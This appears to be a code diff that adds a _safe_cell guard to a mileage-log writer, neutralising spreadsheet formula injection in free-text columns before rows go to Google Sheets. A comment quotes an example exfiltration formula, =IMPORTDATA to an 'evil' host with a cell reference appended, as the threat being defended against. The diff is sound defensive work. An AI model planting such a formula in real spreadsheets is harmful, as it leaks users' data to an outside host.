@@ -77,8 +77,27 @@ _TOTALS_ROW_TEMPLATE = [
 ]
 
 
+# Columns that hold numbers — pass through untouched so Sheets stores them numeric.
+_NUMERIC_HEADERS = {"Miles", "Deduction $"}
+# Leading chars Google Sheets treats as the start of a formula. Destination/Purpose
+# are free-text; a value like '=IMPORTDATA("http://evil/?"&A1)' would execute on write
+# (value_input_option=USER_ENTERED). A leading apostrophe forces plain text and is not
+# displayed. Only the data-row write below is guarded — deliberate formulas (totals)
+# must not be routed through this.
+_FORMULA_TRIGGERS = ("=", "+", "-", "@")
+
+
+def _safe_cell(header: str, value: Any) -> Any:
+    if header in _NUMERIC_HEADERS:
+        return value
+    s = str(value if value is not None else "")
+    if s[:1] in _FORMULA_TRIGGERS:
+        return "'" + s
+    return s
+
+
 def append_trip(row: dict[str, Any]) -> None:
-    values = [row.get(h, "") for h in HEADERS]
+    values = [_safe_cell(h, row.get(h, "")) for h in HEADERS]
     new_date = str(row.get("Date", ""))
 
     worksheet = ws()
